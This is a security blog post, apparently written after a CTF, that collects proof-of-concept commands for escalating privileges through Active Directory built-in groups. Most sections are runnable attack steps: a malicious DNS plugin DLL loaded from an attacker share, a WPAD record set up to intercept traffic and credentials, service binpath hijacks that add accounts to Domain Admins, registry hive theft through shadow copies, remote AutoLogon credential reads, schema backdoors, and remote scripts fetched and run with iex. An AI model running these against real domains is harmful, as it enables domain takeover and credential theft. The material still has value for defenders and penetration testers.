---
layout: single
classes: wide
title:  "Poc'ing Beyond Domain Admin - Part 1"
---
## Overview
During a CTF hosted at the beginning of this year, I popped the machine, got domain context, ran bloodhound as usual and saw that my compromised user was a member of a built-in group in Active Directory.
While searching for that built-in AD groups and what privileges they had on google, it leads me to [Beyond Domain Admin](https://adsecurity.org/?p=3700) by Sean Metcalf where I can read all about that group but it didn't show any POC or any details on how to create one.
After some more time spent on google, I still haven't found any good references and it was really frustrating.
So to avoiding frustration next time I'm up against abusing the built-in groups, I decided to research new abuse techniques and gather the public POC's for each known abusable built-in group in Active Directory and store them in one place, separated into local privilege escalation(LPE) and remote code execution(RCE).

The setup was fully updated 2019 servers + Standalone Windows 10 VM as attacking machine, credentials were set using RunAs /netonly and LPE was performed from a WinRM session. The following groups will not be included for obvious reasons.
* Administrators
* Domain Admins
* Enterprise Admins

## DnsAdmins
Members of the DNSAdmins group have access to network DNS information. The default permissions are as follows: Allow: Read, Write, Create All Child objects, Delete Child objects, Special Permissions.

### RCE loading dll
There is a lot of documented abuses on the DnsAdmin group but the only technique I was able to find was by loading a dll and restarting the DNS service, a technique that would probably crash your service once executed, however. 
By default DnsAdmin doesn't have privileges to restart the DNS service remote or locally, we can see it by enumerating the permissions with this script
[https://gist.githubusercontent.com/cube0x0/Get-ServiceAcl](https://gist.githubusercontent.com/cube0x0/1cdef7a90473443f72f28df085241175/raw/0e26db52faf7261f0ee98559982aca96ea42e26a/Get-ServiceAcl)

```
(Get-ServiceAcl dns).Access

ServiceRights     : QueryConfig, QueryStatus, EnumerateDependents, Start, Stop, PauseContinue, Interrogate, UserDefinedControl, ReadControl
AccessControlType : AccessAllowed
IdentityReference : NT AUTHORITY\SYSTEM

ServiceRights     : QueryConfig, ChangeConfig, QueryStatus, EnumerateDependents, Start, Stop, PauseContinue, Interrogate, UserDefinedControl,
                    Delete, ReadControl, WriteDac, WriteOwner
AccessControlType : AccessAllowed
IdentityReference : BUILTIN\Administrators

ServiceRights     : QueryConfig, QueryStatus, EnumerateDependents, Interrogate, UserDefinedControl, ReadControl
AccessControlType : AccessAllowed
IdentityReference : NT AUTHORITY\INTERACTIVE

ServiceRights     : QueryConfig, QueryStatus, EnumerateDependents, Interrogate, UserDefinedControl, ReadControl
AccessControlType : AccessAllowed
IdentityReference : NT AUTHORITY\SERVICE

ServiceRights     : QueryConfig, ChangeConfig, QueryStatus, EnumerateDependents, Start, Stop, PauseContinue, Interrogate, UserDefinedControl, Delete, ReadControl, WriteDac, WriteOwner
AccessControlType : AccessAllowed
IdentityReference : BUILTIN\Server Operators
```

It's still possible to load a DLL and wait until the next reboot, or if the account has been given additional privileges it would restart the service right away.

```
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Kevin-Robertson/Powermad/master/Powermad.ps1')
New-MachineAccount -MachineAccount cube -Password $(ConvertTo-SecureString 'Password123!' -AsPlainText -Force) -Domain htb.local -DomainController dc.htb.local
msfvenom -p windows/x64/exec cmd='net group "domain admins" cube$ /add /domain' -f dll > dns.dll
dnscmd.exe dc.htb.local /config /serverlevelplugindll \\10.0.0.7\tmp\dns.dll
```

### RCE By Creating WPAD Record
A way better way to abuse the DnsAdmins privileges IMO is to create a wpad record.
As DnsAdmins, we can disable the global query block security function which on default settings, blocks this type of attack. 
Global Query Blocklist was implemented to prevent DNS resolves for WPAD and isatap records because any domain user can create a computer object or DNS records using those names.
Once we have disabled GlobalQueryBlockList and created a wpad record, every machine with wpad running with default settings will have their traffic proxied through our attacker machine, the credential exposure can be huge.
It will be like the good old days before MS16-077.

```
Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc.htb.local
Add-DnsServerResourceRecordA -Name wpad -ZoneName htb.local -ComputerName dc.htb.local -IPv4Address 10.0.0.7
```
## Server Operators
Microsoft describes the Server operators group as someone who can create and delete network shared resources, start and stop services, back up and restore files, format the hard disk drive of the computer

### LPE Reading Sensitive Files
```
https://github.com/giuliano108/SeBackupPrivilege 
Import-Module .\SeBackupPrivilegeCmdLets.dll
Import-Module .\SeBackupPrivilegeUtils.dll
Copy-FileSeBackupPrivilege C:\users\cube0x0\desktop\passwords.txt C:\windows\temp\pass -Overwrite
```

### LPE Modifying Services
Server Operators has write permissions to a lot of services by default, we can enumerate which this way

```
$services=(get-service).name | foreach {(Get-ServiceAcl $_)  | where {$_.access.IdentityReference -match 'Server Operators'}}
# Returns about 65 standard services that Server Operators have privileges over

# We can now search for which of these services is running with SYSTEM privileges
(gci HKLM:\SYSTEM\ControlSet001\Services |Get-ItemProperty | where {$_.ObjectName -match 'LocalSystem' -and $_.pschildname -in $services.name}).PSChildName
```

We choose one service from the output that is going to execute our command in the next step

```
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Kevin-Robertson/Powermad/master/Powermad.ps1')
New-MachineAccount -MachineAccount cube -Password $(ConvertTo-SecureString 'Password123!' -AsPlainText -Force) -Domain htb.local -DomainController dc.htb.local

sc.exe config VSS binpath="C:\Windows\System32\cmd.exe /c net group 'Domain Admins' cube$ /add /domain" type="share" group="" depend=""
sc.exe stop VSS
sc.exe start VSSS
```

### RCE Search SMB Shares For Sensitive Files
```
dir \\dc.htb.local\c$\
```

## Remote Management Users
A group used for low privilege remote management with WinRM/PsRemote.

### RCE WinRM
We can enumerate WinRM endpoints to see which ones the Remote Management Users group has access to.

```
Get-PSSessionConfiguration |where {$_.Permission -match 'Remote Management Users'}

Name          : microsoft.powershell
PSVersion     : 5.1
Permission    : NT AUTHORITY\INTERACTIVE AccessAllowed, BUILTIN\Administrators AccessAllowed, BUILTIN\Remote Management Users
                AccessAllowed

Name          : microsoft.powershell.workflow
PSVersion     : 5.1
Permission    : BUILTIN\Administrators AccessAllowed, BUILTIN\Remote Management Users AccessAllowed

Name          : microsoft.powershell32
PSVersion     : 5.1
Permission    : NT AUTHORITY\INTERACTIVE AccessAllowed, BUILTIN\Administrators AccessAllowed, BUILTIN\Remote Management Users
                AccessAllowed


#Connect to target, microsoft.powershell will be the default endpoint
New-PSSession -ComputerName dc.htb.local
```

## Backup Operators
Members of the Backup Operators group can back up and restore all files on a computer, including making shadow copies.

### LPE Shadow Volume
```
https://github.com/giuliano108/SeBackupPrivilege
Import-Module .\SeBackupPrivilegeCmdLets.dll
Import-Module .\SeBackupPrivilegeUtils.dll

echo @"
set context persistent nowriters
add volume c: alias temp
create
expose %temp% z:
"@ | out-file C:\windows\temp\cmd -encoding ascii

diskshadow.exe /s C:\windows\temp\cmd
Copy-FileSeBackupPrivilege z:\windows\system32\config\SECURITY C:\SECURITY.bak -Overwrite
```

### RCE Search HKLM For Credentials
We have full read access to HKLM\SOFTWARE hive that we can abuse to read AutoLogon credentials for example.

```
$reg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('LocalMachine', 'dc.htb.local',[Microsoft.Win32.RegistryView]::Registry64)
$winlogon = $reg.OpenSubKey('SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon')
$winlogon.GetValueNames() | foreach {"$_ : $(($winlogon).GetValue($_))"}
```

### RCE Search SMB Shares For Sensitive Files
```
dir \\dc.htb.local\c$\
```

## Event Log Readers
Members of this group can read event logs from the local computers

### LPE Credentials Stored in Logs
Credentials are often stored in the winevent logs, we can find them by searching for these Event ID's
* 4103 - Script Block Logging. 
* 4104 - PowerShell module logging. 
* 4688 - Process Creation logging. 

```
wevtutil.exe epl security C:\security.evtx "/q:*[System [(EventID=4688)]]" 
wevtutil.exe epl Microsoft-Windows-PowerShell/Operational C:\win-ps.evtx "/q:*[System [(EventID=4103 or EventID=4104)]]" 
wevtutil.exe epl "Windows PowerShell" C:\ps.evtx "/q:*[System [(EventID=4103 or EventID=4104)]]"
```

We can directly search for events with Process Command Line value

```
Get-WinEvent -Path .\security.evtx | foreach {if($_.Properties[8].value){write-output $_.Properties[8].value}}
```

## Schema Admins
This group can modify the Active Directory schema structure, I haven't found a way to get direct control over an object, just objects that were created after the modification.

### RCE modifying schemas

```
Set-ADObject -Identity "CN=Group-Policy-Container,CN=Schema,CN=Configuration,DC=htb,DC=local" -Replace @{defaultSecurityDescriptor = 'D:(A;;RPWPCRCCDCLCLORCWOWDSDDTSW;;;DA)(A;;RPWPCRCCDCLCLORCWOWDSDDTSW;;;SY)(A;;RPLCLORC;;;AU)(A;;RPWPCRCCDCLCLORCWOWDSDDTSW;;;S-1-5-21-1503354711-114608314-867684489-7112)';} -Verbose -server dc.htb.local

#Once a GPO is created, we can add startup scripts to it
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount Sven --DomainController dc.htb.local --domain htb.local --GPOName "new_dcGPO" --force
```

This will give us full control over the groups that are created after the modification.

```
Set-ADObject -Identity "CN=group,CN=Schema,CN=Configuration,DC=htb,DC=local" -Replace @{defaultSecurityDescriptor = 'D:(A;;RPWPCRCCDCLCLORCWOWDSDDTSW;;;DA)(A;;RPWPCRCCDCLCLORCWOWDSDDTSW;;;SY)(A;;RPLCLORC;;;AU)(A;;RPWPCRCCDCLCLORCWOWDSDDTSW;;;S-1-5-21-1503354711-114608314-867684489-7112)';} -Verbose -server dc.htb.local

#Once a group is created, we can add members
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Kevin-Robertson/Powermad/master/Powermad.ps1')
New-MachineAccount -MachineAccount cube -Password $(ConvertTo-SecureString 'Password123!' -AsPlainText -Force) -Domain htb.local -DomainController dc.htb.local
Add-ADGroupMember new_admingroup -Members cube$ -Server dc.htb.local
```

## ACCOUNT OPERATORS
This group can modify group membership and set users passwords as long the groups or member of is not Administrators, Server Operators, Account Operators, Backup Operators, or Print Operators 

### RCE Adding Members To Privileged Groups
```
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Kevin-Robertson/Powermad/master/Powermad.ps1')
New-MachineAccount -MachineAccount cube -Password $(ConvertTo-SecureString 'Password123!' -AsPlainText -Force) -Domain htb.local -DomainController dc.htb.local
Add-ADGroupMember 'dns admins' -Members cube$ -server dc.htb.local
```

## Group Policy Creators Owners
This group can create GPO's but they cant link it to anything or modify existing GPO's. The creator will have to modify rights over created GPO.

## PRINT OPERATORS
This group can load kernel drivers so we can bring our own vulnerability to the system. I need to do more research to find a reliable POC


## Links
* [https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn579255(v=ws.11)](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn579255(v=ws.11))
* [https://adsecurity.org/?p=3700](https://adsecurity.org/?p=3700)